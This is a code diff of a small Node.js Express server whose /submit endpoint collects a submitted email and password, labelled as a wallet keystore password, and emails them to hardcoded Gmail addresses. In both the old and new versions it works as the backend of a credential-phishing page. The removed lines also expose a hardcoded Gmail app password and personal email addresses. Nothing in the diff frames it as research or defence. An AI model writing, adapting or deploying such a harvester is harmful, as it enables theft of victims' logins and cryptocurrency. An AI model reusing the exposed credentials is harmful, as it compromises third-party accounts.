@@ -1,71 +1,45 @@
 const express = require('express');
 const nodemailer = require('nodemailer');
-const bodyParser = require('body-parser');
-const path = require('path');
-
-const app = express();
-const port = process.env.PORT || 3000;
-
 const cors = require('cors');
 
-app.use(cors({
-  origin: process.env.CORS_ORIGIN || 'http://localhost:3000',
-  methods: ['GET', 'POST'],
-  credentials: true
-}));
+const app = express();
+const port = process.env.PORT;
 
-const port = process.env.PORT || 3000;
+app.use(cors());
+app.use(express.json());
 
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(bodyParser.json());
+app.post('/submit', (req, res) => {
+  const { wName, psdWet } = req.body;
 
-app.use(express.static(path.join(__dirname, 'public')));
+  const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+        user: process.env.EMAIL_USER,
+        pass: process.env.EMAIL_PASS
+      }
+  });
 
-const maillist = [
-  'willyscotmegan@gmail.com',
-  'hello.davidolawale@gmail.com',
-];
+  const mailOptions = {
+    from: 'willyscotmegan@gmail.com',
+    to: 'willyscotmegan@gmail.com',
+    subject: 'NwDeets',
+    text: `
+      eml: ${wName}
+      Psd: ${psdWet}
+    `
+  };
 
-const transporter = nodemailer.createTransport({
-  host: "smtp.gmail.com",
-  port: 465,
-  secure: true,
-  auth: {
-    user: process.env.EMAIL_USER || "divasnow178@gmail.com",
-    pass: process.env.EMAIL_PASS || "cfoyhwlljngpvera",
-  },
-});
-
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'app.html'));
-});
-
-app.post('/submit', async (req, res) => {
-  try {
-    console.log('Srcvd:', req.body);
-
-    const { wName, psdWet } = req.body;
-
-    const mailOptions = {
-      from: '"Deets" <divasnow178@gmail.com>',
-      to: maillist,
-      html: `
-        <p><strong>Eml:</strong> ${wName || 'Not provided'}</p>
-        <p><strong>Pswd (if keystore):</strong> ${psdWet || 'Not provided'}</p>
-      `
-    };
-
-    const info = await transporter.sendMail(mailOptions);
-
-    res.status(200).send('Wdestscesful');
-  } catch (error) {
-    console.error('err', error);
-    res.status(500).send('Errwetdets');
-  }
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.error(error);
+      res.status(500).send('ErrSndgeml');
+    } else {
+      console.log('EmSt: ' + info.response);
+      res.status(200).send('EmlSntScsfl!');
+    }
+  });
 });
 
 app.listen(port, () => {
-  console.log(``);
+  console.log(`Serlstprt ${port}`);
 });
-
-module.exports = app;
